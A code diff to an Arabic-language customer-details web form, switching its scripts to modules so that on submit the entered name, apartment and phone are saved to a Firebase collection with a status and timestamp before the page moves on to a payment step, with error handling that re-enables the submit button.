@@ -24,10 +24,13 @@
       </form>
     </section>
   </main>
-  <script src="draft-sync.js"></script>
-  <script>
-    document.querySelector('#customer-form').addEventListener('submit', event => {
+  <script type="module" src="draft-sync.js"></script>
+  <script type="module">
+    import { db, collection, addDoc, serverTimestamp } from './firebase.js';
+
+    document.querySelector('#customer-form').addEventListener('submit', async event => {
       event.preventDefault();
+      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
       const values = [...event.currentTarget.querySelectorAll('input')];
       const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
       draft.customerName = values[0].value;
@@ -35,7 +38,19 @@
       draft.apartment = values[2].value;
       draft.phone = values[3].value;
       localStorage.setItem('musaedDraft', JSON.stringify(draft));
-      window.location.href = 'payment.html';
+      submitButton.disabled = true;
+      try {
+        await addDoc(collection(db, 'users'), {
+          ...draft,
+          status: 'بيانات العميل',
+          createdAt: serverTimestamp()
+        });
+        window.location.href = 'payment.html';
+      } catch (error) {
+        console.error('تعذر حفظ بيانات العميل في Firebase:', error);
+        submitButton.disabled = false;
+        alert('تعذر إرسال البيانات. يرجى المحاولة مرة أخرى.');
+      }
     });
   </script>
 </body>
